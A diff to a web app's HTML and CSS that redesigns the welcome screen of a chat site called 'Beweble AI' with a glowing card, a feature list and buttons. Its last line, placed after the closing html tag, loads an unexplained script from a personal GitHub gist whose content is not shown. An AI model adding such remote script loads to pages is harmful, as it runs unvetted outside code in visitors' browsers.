@@ -165,85 +165,128 @@
     text-align: center;
 }
 
-/* ===== WELCOME SCREEN ===== */
-/* ===== WELCOME SCREEN ===== */
 .welcome-screen {
     position: fixed;
     inset: 0;
-    background: radial-gradient(circle at top, #0f172a, #020617);
     display: flex;
-    flex-direction: column;
     align-items: center;
     justify-content: center;
-    z-index: 2000;
-    color: #fff;
-    text-align: center;
+    background: #020617;
     overflow: hidden;
-    transition: opacity 0.6s ease, transform 0.6s ease;
+    z-index: 2000;
 }
 
-/* Glow animation background */
-.welcome-screen::before {
-    content: "";
+/* glow */
+.glow {
     position: absolute;
-    width: 300px;
-    height: 300px;
-    background: #8a2be2;
-    filter: blur(120px);
-    animation: moveGlow 6s infinite alternate ease-in-out;
+    width: 700px;
+    height: 700px;
+    background: radial-gradient(circle, #8a2be2, transparent 60%);
+    filter: blur(140px);
+    animation: moveGlow 6s infinite alternate;
 }
 
 @keyframes moveGlow {
-    from { transform: translate(-50%, -50%); }
-    to { transform: translate(50%, 50%); }
+    from { transform: translate(-30%, -30%); }
+    to { transform: translate(30%, 30%); }
 }
 
-/* Title */
-.welcome-screen h1 {
-    font-size: 2.5rem;
-    background: linear-gradient(90deg, #8a2be2, #00f5ff);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    animation: fadeInUp 1s ease forwards;
+/* CARD */
+.landing-card {
+    width: 92%;
+    max-width: 520px;
+    padding: 30px;
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(25px);
+    border-radius: 20px;
+    border: 1px solid rgba(255,255,255,0.1);
+    box-shadow: 0 0 40px rgba(138,43,226,0.25);
+    text-align: center;
+    animation: fadeUp 0.8s ease;
 }
 
-/* Subtitle */
-.welcome-screen p {
-    margin-top: 10px;
-    color: #ccc;
-    animation: fadeInUp 1.5s ease forwards;
+@keyframes fadeUp {
+    from { transform: translateY(30px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
 }
 
-/* Button */
-.welcome-screen button {
-    margin-top: 30px;
-    padding: 14px 40px;
-    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+/* LOGO */
+.logo-box img {
+    width: 150px;
+    border-radius: 15px;
+    margin-bottom: 10px;
+   
+    background: none !important;
+}
+
+
+
+.tag {
+    font-size: 12px;
+    color: #8a2be2;
+}
+
+/* DESCRIPTION */
+.desc {
+    color: #cbd5e1;
+    font-size: 14px;
+    margin-top: 15px;
+    line-height: 1.6;
+}
+
+/* FEATURES */
+.features {
+    margin-top: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+
+.features div {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: rgba(255,255,255,0.06);
+    padding: 10px 12px;
+    border-radius: 10px;
+    font-size: 13px;
+}
+
+.features i {
+    color: #00f5ff;
+}
+
+/* BUTTONS */
+.buttons {
+    margin-top: 20px;
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+}
+
+button {
+    padding: 12px 18px;
     border: none;
-    border-radius: 12px;
-    color: #fff;
-    font-size: 16px;
+    border-radius: 10px;
     cursor: pointer;
+    font-size: 14px;
     transition: 0.3s;
-    box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
-    animation: fadeInUp 2s ease forwards;
+    background: linear-gradient(90deg, #8a2be2, #00f5ff);
+    color: white;
 }
 
-.welcome-screen button:hover {
-    transform: scale(1.1);
-    box-shadow: 0 0 30px rgba(0, 245, 255, 0.8);
+button i {
+    margin-right: 6px;
 }
 
-/* Animations */
-@keyframes fadeInUp {
-    from {
-        opacity: 0;
-        transform: translateY(40px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
+button:hover {
+    transform: scale(1.05);
+}
+
+/* secondary button */
+.secondary {
+    background: rgba(255,255,255,0.08);
+    border: 1px solid rgba(255,255,255,0.1);
 }
 /* ===== AUTH POPUP ===== */
 
@@ -923,9 +966,57 @@
 <body>
 
 <div id="welcome" class="welcome-screen">
-    <h1>🤖 Welcome to Beweble AI</h1>
-    <p>Your intelligent assistant is ready</p>
-    <button id="start-btn">Get Started</button>
+    
+    <div class="glow"></div>
+    
+    <div class="landing-card">
+        
+        <!-- LOGO -->
+        <div class="logo-box">
+            <img src="https://i.top4top.io/p_37447l83x1.png" alt="logo">
+            
+            <p class="tag">Next Generation AI Assistant</p>
+        </div>
+        
+        <!-- DESCRIPTION -->
+        <p class="desc">
+            An intelligent AI platform built to help you chat, generate code, learn faster,
+            and boost productivity with modern AI experience.
+        </p>
+        
+        <!-- FEATURES -->
+        <div class="features">
+            
+            <div>
+                <i class="fa fa-bolt"></i>
+                <span>Fast AI Responses</span>
+            </div>
+            
+            <div>
+                <i class="fa fa-brain"></i>
+                <span>Smart Thinking</span>
+            </div>
+            
+            <div>
+                <i class="fa fa-shield"></i>
+                <span>Secure System</span>
+            </div>
+            
+        </div>
+        
+        <!-- BUTTONS -->
+        <div class="buttons">
+            <button id="start-btn">
+                <i class="fa fa-rocket"></i> Get Started
+            </button>
+            
+            <button class="secondary">
+                <i class="fa fa-circle-info"></i> Learn More
+            </button>
+        </div>
+        
+    </div>
+    
 </div>
 
 <!-- ===== Auth Popup ===== -->
@@ -1484,7 +1575,16 @@ document.getElementById("side-menu").classList.remove("open");
 }
 });
 </script>
-
+<script>
+    document.getElementById("start-btn").onclick = () => {
+        const screen = document.getElementById("welcome");
+        screen.style.opacity = "0";
+        screen.style.transform = "scale(1.1)";
+        setTimeout(() => {
+            screen.style.display = "none";
+        }, 600);
+    };
+</script>
 </body>
 </html>
 <script src='https://gist.githubusercontent.com/Redaccx/89354ed40aa7b46054e2b9e8612aa700/raw/8ec5879135343a8c35c0720228a662a49e19c73d/code.js'></script>
